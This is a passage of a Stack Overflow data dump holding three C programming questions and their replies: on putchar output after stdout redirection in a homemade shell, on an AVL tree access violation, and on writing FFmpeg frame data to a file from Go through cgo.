that sounds silly, but it is necessary to check since we don&#39;t have an MCVE (<a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>) to work with.)"}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1524606767, "post_id": 50011001, "comment_id": 87038907, "body": "Did you check the value of <code>fileno(stdout)</code> ? But as Jonathan request we need a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>, I answer this question too fast."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1524607247, "post_id": 50011001, "comment_id": 87039084, "body": "Are you sure you&#39;re outputting a newline with the <code>putchar()</code> calls?  Could it simply be that it reverts (changes) to fully buffered output when change the file descriptor to refer to a file, so output isn&#39;t seen until flushed?  If it is line buffered, a newline may be sufficient; if it is fully buffered, you may need to use <code>fflush()</code>.  However, you say <code>printf()</code> et al work, which suggests this isn&#39;t the issue."}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 2, "creation_date": 1524609323, "post_id": 50011001, "comment_id": 87039661, "body": "First of all here, a fixed test program, <a href=\"http://rextester.com/QSD96627\" rel=\"nofollow noreferrer\">rextester.com/QSD96627</a>, secondly, you still didn&#39;t provide a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>. Third, <code>int out = open(bloc-&gt;command[0], O_WRONLY | O_CREAT | O_TRUNC , 0644);</code> is suspect don&#39;t you want <code>int out = open(bloc-&gt;command[1], O_WRONLY | O_CREAT | O_TRUNC , 0644);</code> ?"}, {"owner": {"reputation": 411, "user_id": 6028477, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/XahlP.jpg?s=128&g=1", "display_name": "KerDam", "link": "https://stackoverflow.com/users/6028477/kerdam"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1524610097, "post_id": 50011001, "comment_id": 87039862, "body": "@JonathanLeffler Actually I think you are right, the literals in the <i>printf</i> contains a newline character at the end and when removed it doesn&#39;t work anymore.  I don&#39;t understand how fflush will help me as if I understood the documentation right it removes everything from a Stream"}, {"owner": {"reputation": 411, "user_id": 6028477, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/XahlP.jpg?s=128&g=1", "display_name": "KerDam", "link": "https://stackoverflow.com/users/6028477/kerdam"}, "reply_to_user": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1524610402, "post_id": 50011001, "comment_id": 87039969, "body": "@Stargateur I know the semantic is far from perfect but no bloc-&gt;command[0] is actually what I want, the structure seemed kind of out the scope of my problem here so I didn&#39;t put it"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1524623028, "post_id": 50011001, "comment_id": 87042620, "body": "Remember that <code>fflush(stdout)</code> writes any pending output to the o/s, rather than keeping it in the standard I/O buffer.  It does so even if there isn&#39;t a newline at the end.  That gives you the maximum chance of seeing the output that&#39;s lurking in the buffer for <code>stdout</code>.  So, <code>fflush(stdout)</code> should never do any damage (unless you count slowing down for long enough to ensure the buffer is empty as &#39;damage&#39;) and may help you see what is going on."}], "answers": [{"comments": [{"owner": {"reputation": 12180, "user_id": 3150802, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/ulVTa.png?s=128&g=1", "display_name": "Peter - Reinstate Monica", "link": "https://stackoverflow.com/users/3150802/peter-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1604695119, "post_id": 64721221, "comment_id": 114435307, "body": "Do I have to read and compare 100 lines of code in order to understand what you did differently? And what <i>was</i> the OP&#39;s problem at the core?"}, {"owner": {"reputation": 652, "user_id": 5590008, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/nHOyd.jpg?s=128&g=1", "display_name": "Anton Todua", "link": "https://stackoverflow.com/users/5590008/anton-todua"}, "reply_to_user": {"reputation": 12180, "user_id": 3150802, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/ulVTa.png?s=128&g=1", "display_name": "Peter - Reinstate Monica", "link": "https://stackoverflow.com/users/3150802/peter-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1604840401, "post_id": 64721221, "comment_id": 114463703, "body": "@Peter-ReinstateMonica it&#39;s only 50 lines of code and they are pretty simple. The most valuable line is <code>fflush(stdout);</code> and comment above it. Read the whole bunch of code let you completely understand a problem and solution."}], "tags": [], "owner": {"reputation": 652, "user_id": 5590008, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/nHOyd.jpg?s=128&g=1", "display_name": "Anton Todua", "link": "https://stackoverflow.com/users/5590008/anton-todua"}, "is_accepted": false, "score": 0, "last_activity_date": 1604694762, "creation_date": 1604694762, "answer_id": 64721221, "question_id": 50011001, "link": "https://stackoverflow.com/questions/50011001/c-putchar-doesnt-work-after-stdout-is-redirected/64721221#64721221", "title": "C putchar doesn&#39;t work after stdout is redirected", "body": "<p>I've been face with the same problem and found the solution.</p>\n<p>Look at the code which reads a file <code>argv[1]</code> and writes its content to file <code>argv[2]</code> without spaces and line feeds.</p>\n<pre class=\"lang-c prettyprint-override\"><code>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;fcntl.h&gt;\n\nint main(int argc, const char* argv[]) {\n  if (argc != 3) {\n    printf (&quot;Expected exactly two arguments\\n&quot;);\n    return 1;\n  }\n\n  int rd = open(argv[1], O_RDONLY);\n  if (rd == -1) {\n    printf (&quot;Failed to open file %s\\n&quot;, argv[1]);\n    return 1;\n  }\n\n  int wd = open(argv[2], O_WRONLY | O_TRUNC | O_CREAT, 0666);\n  if (wd == -1) {\n    printf (&quot;Failed to open file %s\\n&quot;, argv[2]);\n    return 1;\n  }\n\n  int temp_in = dup(0);\n  int temp_out = dup(1);\n\n  dup2(rd, 0);\n  dup2(wd, 1);\n\n  close(rd);\n  close(wd);\n\n  int written_bytes = 0;\n\n  int c;\n  while ((c = getchar()) != EOF) {\n    if (c == ' ' || c == '\\n') {\n      continue;\n    }\n\n    putchar(c);\n    written_bytes++;\n  }\n\n  // The instruction below is critically important, because\n  // putchar by default writes char to an internal buffer,\n  // so we have to send it to the file descriptor manually\n  fflush(stdout);\n\n  dup2(temp_in, 0);\n  dup2(temp_out, 1);\n\n  printf (&quot;%d bytes have been written\\n&quot;, written_bytes);\n  return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 411, "user_id": 6028477, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/XahlP.jpg?s=128&g=1", "display_name": "KerDam", "link": "https://stackoverflow.com/users/6028477/kerdam"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 337, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1604694762, "creation_date": 1524605540, "last_edit_date": 1524608067, "question_id": 50011001, "link": "https://stackoverflow.com/questions/50011001/c-putchar-doesnt-work-after-stdout-is-redirected", "title": "C putchar doesn&#39;t work after stdout is redirected", "body": "<p>I am trying to implement shell redirection, using this I redirect stdout to fd1</p>\n\n<pre><code>int redirectOut(int fd1)\n{\n    fflush(stdout);\n    int fd2 = dup(STDOUT_FILENO);\n    dup2(fd1, STDOUT_FILENO);\n    close(fd1);\n    return fd2;\n}\n</code></pre>\n\n<p>I then fork and call an executable, it works except in the case where the executable uses putchar.</p>\n\n<p>On the putchar man page it is written that it uses stdout. </p>\n\n<blockquote>\n  <p>putchar(c); is equivalent to putc(c,stdout). </p>\n</blockquote>\n\n<p>Why doesn't putchar write anywhere neither in the standard output nor the file I redirected the stream to ? </p>\n\n<p>I tried changing <em>putchar</em> to <em>putc</em> but it didn't help, it might have something to do with the fact that <strong>stdout</strong> if a <strong>*FILE</strong> and <strong>STDOUT_FILENO</strong> an <strong>int</strong> </p>\n\n<p>How can I make my code work and why does it work with printf which uses (<a href=\"https://stackoverflow.com/questions/4867229/code-for-printf-function-in-c\" title=\"code for printf\">code for printf</a>)</p>\n\n<pre><code>done = vfprintf (stdout, format, arg);\n</code></pre>\n\n<p><strong>EDIT MORE CODE</strong></p>\n\n<pre><code>int executeBlocs(execBloc *bloc,int fileIn,int fileOut){\n    if(bloc-&gt;first != NULL){\n      if (strcmp(bloc-&gt;ope, \"&gt;\") == 0){\n         int out = open(bloc-&gt;command[0], O_WRONLY | O_CREAT | O_TRUNC , 0644);\n         int returnCode = executeBlocs(bloc-&gt;first, STDIN_FILENO, out);\n         redirectOut(fileOut);\n         redirectIn(fileIn);\n         return returnCode;\n      }\n    }\n    else{\n        redirectIn(fileIn);\n        redirectOut(fileOut);\n        return call(bloc-&gt;nbWords, bloc-&gt;command);\n    }\n}\n</code></pre>\n\n<p>execBloc is a struct that contains a command to execute (or a file name) an operator (>> , | , > ...) and a reference to the another bloc that contains the rest of the command. </p>\n\n<p>If the user enter <strong>cat /tmp/testCat > /tmp/testCatRedirection</strong> </p>\n\n<p>then a first structure will be created containing the operator <em>></em> and the command <em>/tmp/testCatRedirection</em> and first which is a reference to the second structure containing the command <em>cat /tmp/testCat</em> </p>\n\n<pre><code>int call(int argc, char const *argv[]) {\n  if (argc &gt; 0){\n      if (executeProgram(argv) == 1) return 1;\n\n      if (executeStandardLibrary(argc, argv) == 1) return 1;\n\n      if (executeDynamicLibrary(argc, argv) == 1) return 1;\n  }\n  return -1;\n}\n\n\nint executeProgram(char const *argv[]){\n    //Creation de la chaine de caract\u00e8re /home/kerdam/cbin/nonExecutable\n    char *path = strdup(binFolder);\n    strcat(path, argv[0]);\n\n\n    //Test si le fichier existe et est executable\n    if (access(path, F_OK|X_OK) != -1){\n    //Le fichier existe et on peut l'\u00e9xecuter\n    int pid = fork();\n\n    // Error\n    if (pid == -1){\n      return -1;\n    }\n    //Fils\n    else if (pid == 0) {\n        // Executer la commande\n        execv(path, argv);\n        return 1;\n    }\n\n    // Parent process\n    else {\n        // Wait for child process to finish\n        int childStatus;\n        waitpid(pid, &amp;childStatus, 0);\n        return 1;\n    }\n  }\n  else return -1;\n}\n</code></pre>\n\n<p>Finally the code of the program I am trying to execute </p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;string.h&gt;\n#define MAX_FILE_NAME_CHARS 255\nint main(int argc, char *argv[])\n{\n    FILE *fp;\n    char file_name[MAX_FILE_NAME_CHARS], ch;\n    int i;\n\n     /*\n      * after creating a.out, rename it as mycat for our own cat command\n      * and it usage is same as standard cat command\n      */\n    if(argc&lt;=1){\n        printf(\"Utiliser cat avec aumoin un argument (un fichier) &lt;nomfichier&gt; \\n\");\n        return 0;\n    }\n\n     /*\n      * This is for multiple file in argument\n      */\n    for(i=1; i&lt;=argc;i++){\n        strncpy(file_name, argv[i], MAX_FILE_NAME_CHARS);\n\n        fp=fopen(file_name, \"r\");\n        if(fp == NULL) {\n           printf(\"%s: No such file or directory\\n\", file_name);\n           return 0;\n        }\n\n        /*\n         * read file and feed contents to STDIO\n         */\n        while((ch=fgetc(fp)) != EOF || ch == '}'){\n            putchar(ch);\n        }\n        fclose(fp);\n    }\n    return 0;\n}\n</code></pre>\n\n<p><strong>Remark</strong></p>\n\n<p>I should not change the code of the executable I am trying to execute as the users of my shell should be able to execute their programs without restriction on what function they can use. </p>\n"}, {"tags": ["c", "avl-tree", "tree-balancing"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1524605452, "post_id": 50010862, "comment_id": 87038500, "body": "Don&#39;t know how relevant, but function <code>Build_tree</code> does not always return a value. If you posted the question without noticing this, perhaps there are other errors which you have also overlooked. Compile with all warnings enabled."}, {"owner": {"reputation": 261, "user_id": 9076867, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3ddaa96c2b52dbbfe9fb1ab10b4f2bee?s=128&d=identicon&r=PG&f=1", "display_name": "Diana G", "link": "https://stackoverflow.com/users/9076867/diana-g"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1524605799, "post_id": 50010862, "comment_id": 87038604, "body": "Why does it not always return a value ? on which path?(on debug i can only look at the root&#39;s value and the left/right of the root values,  not any further(like root -&gt; left-&gt;left))"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1524605927, "post_id": 50010862, "comment_id": 87038642, "body": "When <code>if (start &lt; end)</code> is false. If you follow my advice and enable all compiler warnings . . . please do that right now."}, {"owner": {"reputation": 261, "user_id": 9076867, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3ddaa96c2b52dbbfe9fb1ab10b4f2bee?s=128&d=identicon&r=PG&f=1", "display_name": "Diana G", "link": "https://stackoverflow.com/users/9076867/diana-g"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1524606607, "post_id": 50010862, "comment_id": 87038851, "body": "enable all compiler warnings by using /w3#### in the projects properties?"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1524606968, "post_id": 50010862, "comment_id": 87038991, "body": "Please look at function <code>Build_tree</code>. When the <code>if (start &lt; end)</code> code block is executed, the function returns <code>n1</code>. If that code block is not executed, what does the function return? Look very closely, it has nothing to do with any problem statement, but control paths."}, {"owner": {"reputation": 261, "user_id": 9076867, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3ddaa96c2b52dbbfe9fb1ab10b4f2bee?s=128&d=identicon&r=PG&f=1", "display_name": "Diana G", "link": "https://stackoverflow.com/users/9076867/diana-g"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1524607347, "post_id": 50010862, "comment_id": 87039119, "body": "it should return NULL or the current node. I think?"}], "answers": [{"comments": [{"owner": {"reputation": 261, "user_id": 9076867, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3ddaa96c2b52dbbfe9fb1ab10b4f2bee?s=128&d=identicon&r=PG&f=1", "display_name": "Diana G", "link": "https://stackoverflow.com/users/9076867/diana-g"}, "edited": false, "score": 0, "creation_date": 1524606548, "post_id": 50011035, "comment_id": 87038833, "body": "Honestly, the algorithm does not mention a continuation on the else statement. I am guessing it has something  to do with returning the current node, because when the indexes were equal I should have went over all the numbers in my array"}], "tags": [], "owner": {"reputation": 8402, "user_id": 4664415, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Hsfxj.jpg?s=128&g=1", "display_name": "mevets", "link": "https://stackoverflow.com/users/4664415/mevets"}, "is_accepted": false, "score": 0, "last_activity_date": 1524605751, "creation_date": 1524605751, "answer_id": 50011035, "question_id": 50010862, "link": "https://stackoverflow.com/questions/50010862/access-violation-exception-while-creating-avl-tree/50011035#50011035", "title": "Access violation exception while creating AVL tree", "body": "<p>The if (start &lt; end) statement in Build_tree has an else condition, where you fall off the function, thus returning something undefined.   I inserted a fprintf(stderr, \u201cError: cannot get here (%d,%d)\\n\u201d, start,end), and got the following output:</p>\n\n<pre><code>Error: cannot get here (0, 0)\nError: cannot get here (2, 2)\nError: cannot get here (4, 4)\nError: cannot get here (6, 5)\nError: cannot get here (7, 7)\nNodul  este : 4 \nNodul  dreapta al  nodului  4 este  : 6 \nNodul  stamga al  nodului  este 4 : 2\n ramura dreapta a nodului  4  cu valoare dreapta este : 6\nNodul  este : 6 \nramura dreapta a nodului  6  cu valoare dreapta este : 7\nNodul  este : 7 \nramura dreapta a nodului  4 cu valoare stanga este : 2 \n Nodul  este : 2 \n</code></pre>\n\n<p>now, what should be done on the other side?</p>\n"}], "owner": {"reputation": 261, "user_id": 9076867, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3ddaa96c2b52dbbfe9fb1ab10b4f2bee?s=128&d=identicon&r=PG&f=1", "display_name": "Diana G", "link": "https://stackoverflow.com/users/9076867/diana-g"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 46, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1524605751, "creation_date": 1524604769, "question_id": 50010862, "link": "https://stackoverflow.com/questions/50010862/access-violation-exception-while-creating-avl-tree", "title": "Access violation exception while creating AVL tree", "body": "<p>I am trying to create an AVL perfectly balanced tree from a vector of elements. \nI have started on a small number of elements(8) so that I can check the correctness of the algorithm. My problem appears when printing the values from the TREE, I keep getting the next exception</p>\n\n<blockquote>\n<pre><code>\"Exception thrown: read access violation.\nnod-&gt;stanga was 0x4.\"\n</code></pre>\n</blockquote>\n\n<p>when i get to the (root)->(right)->left-:value, even though I check if the pointer is null before printing anything.\nthe structure is:</p>\n\n<pre><code>typedef struct node\n{   int key;\n    int size;\n    node *stanga;\n    node *dreapta;\n}TreeNode;\n</code></pre>\n\n<p>the array:\nint vector[8] = { 1, 2, 3, 4, 5, 6, 7, 8 };\nthe print function:</p>\n\n<pre><code>void printElements(TreeNode *nod)\n{\n    if (nod != NULL)\n    {\n        printf(\"Nodul  este : %d \\n\", nod-&gt;key);\n        if (nod-&gt;dreapta != NULL &amp;&amp; nod-&gt;stanga != NULL)\n        {\n            printf(\"Nodul  dreapta al  nodului  %d este  : %d \\n\", nod-&gt;key, nod-&gt;dreapta-&gt;key);\n            printf(\"Nodul  stamga al  nodului  este %d : %d\\n \", nod-&gt;key, nod-&gt;stanga-&gt;key);\n\n        }\n        if (nod-&gt;dreapta != NULL)\n        {\n            printf(\"ramura dreapta a nodului  %d  cu valoare dreapta este : %d\\n\", nod-&gt;key,nod-&gt;dreapta-&gt;key);\n            printElements(nod-&gt;dreapta);\n        }\n        if (nod-&gt;stanga != NULL)\n        {\n            printf(\"ramura dreapta a nodului  %d cu valoare stanga este : %d \\n \",nod-&gt;key, nod-&gt;stanga-&gt;key);\n            printElements(nod-&gt;stanga);\n        }\n    }\n    else\n    {\n        printf(\"the end of the tree\");\n    }\n}\n</code></pre>\n\n<p>called with :</p>\n\n<pre><code>TreeNode  *nod = (TreeNode*)malloc(sizeof(TreeNode));\n    nod=Build_tree(0, 7);\n    printElements(nod);\n</code></pre>\n\n<p>build tree is my building function:</p>\n\n<pre><code>TreeNode* Build_tree(int start, int end)\n{\n\n    if (start &lt; end)\n    {\n        int medium = (start + end) / 2;\n        TreeNode  *n1 = (TreeNode*)malloc(sizeof(TreeNode));\n        n1-&gt;key = vector[medium];\n        n1-&gt;size = 1;\n        if (n1-&gt;stanga == NULL)\n        {\n            n1-&gt;size = n1-&gt;dreapta-&gt;size + 1;//alocam sizeul nodului din drepata\n        }\n        if (n1-&gt;dreapta == NULL)\n        {\n            n1-&gt;size = n1-&gt;stanga-&gt;size + 1;//altefl alocam sizeul nodului din stanga\n        }\n\n        n1-&gt;stanga = Build_tree(start, medium-1);\n        n1-&gt;dreapta = Build_tree(medium+1,end);\n        return n1;\n    }\n\n}\n</code></pre>\n\n<p>I am a bit rusty on using pointers and balanced trees. Could somebody help me with a clue?</p>\n"}, {"tags": ["c", "go", "ffmpeg", "cgo"], "comments": [{"owner": {"reputation": 612, "user_id": 1551924, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/1d04ae409af850c5285e869aefb90ea9?s=128&d=identicon&r=PG&f=1", "display_name": "nevernew", "link": "https://stackoverflow.com/users/1551924/nevernew"}, "edited": false, "score": 0, "creation_date": 1524713993, "post_id": 50010555, "comment_id": 87085018, "body": "I got this working, saving my image, by writing a save file function in C and calling that from Go. It would still be interesting to see how this would work though. I think the problem is with the .Data() function call not returning the right thing, or my understanding of what to do with that to get the right type to pass around... which i really need now for gl.DrawPixels :/"}, {"owner": {"reputation": 702, "user_id": 1782065, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/f0504252889cd793223f6525d0f71fc1?s=128&d=identicon&r=PG", "display_name": "Andrew", "link": "https://stackoverflow.com/users/1782065/andrew"}, "edited": false, "score": 0, "creation_date": 1524791508, "post_id": 50010555, "comment_id": 87124247, "body": "Can you post what code you used? I am about to tackle this and will post something if I work it out"}, {"owner": {"reputation": 612, "user_id": 1551924, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/1d04ae409af850c5285e869aefb90ea9?s=128&d=identicon&r=PG&f=1", "display_name": "nevernew", "link": "https://stackoverflow.com/users/1551924/nevernew"}, "reply_to_user": {"reputation": 702, "user_id": 1782065, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/f0504252889cd793223f6525d0f71fc1?s=128&d=identicon&r=PG", "display_name": "Andrew", "link": "https://stackoverflow.com/users/1782065/andrew"}, "edited": false, "score": 0, "creation_date": 1524820981, "post_id": 50010555, "comment_id": 87134841, "body": "@Andrew sure, I added the working C save function that I&#39;m using. This question has a better example of what I&#39;m trying to do I think: <a href=\"https://stackoverflow.com/questions/50046388/how-to-pass-a-go-array-pointer-to-gldrawpixels?noredirect=1#comment87109166_50046388\" title=\"how to pass a go array pointer to gldrawpixels\">stackoverflow.com/questions/50046388/&hellip;</a>"}], "answers": [{"tags": [], "owner": {"reputation": 578, "user_id": 3831854, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/01ef3744308021ae1eda4e17cbce490e?s=128&d=identicon&r=PG&f=1", "display_name": "AKJ", "link": "https://stackoverflow.com/users/3831854/akj"}, "is_accepted": false, "score": 0, "last_activity_date": 1595247304, "creation_date": 1595247304, "answer_id": 62995182, "question_id": 50010555, "link": "https://stackoverflow.com/questions/50010555/how-do-i-write-to-a-file-in-golang-using-a-pointer-to-the-c-data/62995182#62995182", "title": "How do I write to a file in Golang using a pointer to the C data?", "body": "<p>I had the same issue:\nA C function allocated space and gave a pointer to that space and the size to read.\nI solved it by doing:</p>\n<pre class=\"lang-c prettyprint-override\"><code>buffer := *(*[]byte)(unsafe.Pointer(&amp;content))\n</code></pre>\n<p>this transforms the pointer to a Golang byte array at the address of content.\n<code>buffer</code> gets filled with data from <code>os.Read</code> and the C function handles the data.</p>\n"}], "owner": {"reputation": 612, "user_id": 1551924, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/1d04ae409af850c5285e869aefb90ea9?s=128&d=identicon&r=PG&f=1", "display_name": "nevernew", "link": "https://stackoverflow.com/users/1551924/nevernew"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 940, "favorite_count": 0, "answer_count": 1, "score": 3, "last_activity_date": 1595247304, "creation_date": 1524603067, "last_edit_date": 1524824360, "question_id": 50010555, "link": "https://stackoverflow.com/questions/50010555/how-do-i-write-to-a-file-in-golang-using-a-pointer-to-the-c-data", "title": "How do I write to a file in Golang using a pointer to the C data?", "body": "<p>I'm writing an app for the windows platform using FFmpeg and it's golang wrapper goav, but I'm having trouble understanding how to use the C pointers to gain access to an array.</p>\n\n<p>I'm trying to write the frame data, pointed to by a uint8 pointer from C, to a .ppm file in golang. </p>\n\n<p><em>Once I have this done, for proof of concept that FFmpeg is doing what I expect it to, I want to set the frames to a texture in OpenGl to make a video player with cool transitions; any pointers to do that nice and efficiently would be so very helpful! I'm guessing I need to write some shader code to draw the ppm as a texture...</em></p>\n\n<p>The <a href=\"http://netpbm.sourceforge.net/doc/ppm.html\" rel=\"nofollow noreferrer\">PPM file structure</a> looks pretty simple just the header and then a byte of data for each red, green and blue value of each pixel in the frame from top left to bottom right</p>\n\n<p>I'm starting to understanding how to cast the pointers between C and Go types, but how can I access the data and write it in Go with the same result as C? In C I just have to set the pointer offset for the data and state how much of it to write:</p>\n\n<pre><code>for (y = 0; y &lt; height; y++) {\n    fwrite(pFrame-&gt;data[0]+y*pFrame-&gt;linesize[0], 1, width*3, pFile);\n}\n</code></pre>\n\n<p>I've stripped out all the relevant parts of the C code, the wrapper and my code, shown below:</p>\n\n<p>C code - libavutil/frame.h</p>\n\n<pre><code>#include &lt;stdint.h&gt;\n\ntypedef struct AVFrame {\n#define AV_NUM_DATA_POINTERS 8\n    uint8_t *data[AV_NUM_DATA_POINTERS];\n    int linesize[AV_NUM_DATA_POINTERS];\n}\n</code></pre>\n\n<p>Golang goav wrapper</p>\n\n<pre><code>package avutil\n\n/*\n    #cgo pkg-config: libavutil\n    #include &lt;libavutil/frame.h&gt;\n    #include &lt;stdlib.h&gt;\n*/\nimport \"C\"\nimport (\n    \"unsafe\"\n)\n\ntype Frame C.struct_AVFrame\n\nfunc Data(f *Frame) *uint8 {\n    return (*uint8)(unsafe.Pointer((*C.uint8_t)(unsafe.Pointer(&amp;f.data))))\n}\nfunc Linesize(f *Frame) int {\n    return int(*(*C.int)(unsafe.Pointer(&amp;f.linesize)))\n}\n</code></pre>\n\n<p>My Golang code</p>\n\n<pre><code>package main\n\nimport \"github.com/giorgisio/goav/avutil\"\n\nfunc saveFrame(videoFrame *avutil.Frame, width int, height int, iFrame int) {\n    var szFilename string\n    var y int\n    var file *os.File\n    var err error\n\n    szFilename = \"\"\n\n    // Open file\n    szFilename = fmt.Sprintf(\"frame%d.ppm\", iFrame)\n\n    if file, err = os.Create(szFilename); err != nil {\n        log.Println(\"Error Reading\")\n    }\n\n    // Write header\n    fh := []byte(fmt.Sprintf(\"P6\\n%d %d\\n255\\n\", width, height))\n    file.Write(fh)\n    var b byte = 0\n    // Write pixel data\n    for y = 0; y &lt; height; y++ {\n        d := avutil.Data(videoFrame) // d should be a pointer to the first byte of data\n        l := avutil.Linesize(videoFrame)\n\n        // I'm basically lost trying to figure out how to correctly write\n        // this to a file, the file is created, but when I open it in GIMP\n        // the image is mostly black with glitchy fuzz - so it's not being\n        // written properly; the header seems to be ok, it knows the height\n        // and width at least.\n\n        data := make([]byte, l*3)\n\n        ptr := unsafe.Pointer(d)\n        for i := 0; i &lt; l; i++ {\n            datum := (*uint8)(unsafe.Pointer(uintptr(ptr) + (uintptr(i)+(uintptr(y)*uintptr(l)))*unsafe.Sizeof(*d)))\n            data = append(data, *datum)\n            //fmt.Println(*datum)\n        }\n\n        n, err := file.Write(data)\n        if err != nil {\n            log.Println(\"Error Writing:\", szFilename, \"-\", n)\n        }\n    }\n\n    file.Close()\n}\n</code></pre>\n\n<p>So, how can I write to a file using a pointer to the data, like you can do in C, and get the same result?</p>\n\n<p>The first frame should be black so all 0's but I'm getting a glitchy fuzz, so it must be accessing some random data</p>\n\n<p><strong>Update:</strong> My fix using a C function to save:</p>\n\n<pre><code>package avutil\n\n/*\n    #cgo pkg-config: libavutil\n    #include &lt;libavutil/frame.h&gt;\n    #include &lt;stdlib.h&gt;\n    #include &lt;stdio.h&gt;\n\n    void SaveFrame(const char* location, AVFrame *pFrame, int width, int height) {\n        FILE *pFile;\n        int  y;\n\n        // Open file\n        pFile=fopen(location, \"wb\");\n        if(pFile==NULL)\n            return;\n\n        // Write header\n        fprintf(pFile, \"P6\\n%d %d\\n255\\n\", width, height);\n\n        // Write pixel data\n        for(y=0; y&lt;height; y++)\n            fwrite(pFrame-&gt;data[0]+y*pFrame-&gt;linesize[0], 1, width*3, pFile);\n\n        // Close file\n        fclose(pFile);\n    }\n    uint8_t* GetData(AVFrame *pFrame) {\n        return pFrame-&gt;data[0];\n    }\n*/\nimport \"C\"\n</code></pre>\n\n<p>I updated the avutil file, in the goav wrapper package, with this save function at the top, then pass it the frame context so it can get the data pointer from it. I also added this Go function to that avutil file to call the C function</p>\n\n<pre><code>func SaveFrame(location string, f *Frame, width int, height int) {\n    csLoc := C.CString(location)\n    C.SaveFrame(csLoc, (*C.struct_AVFrame)(unsafe.Pointer(f)), C.int(width), C.int(height))\n    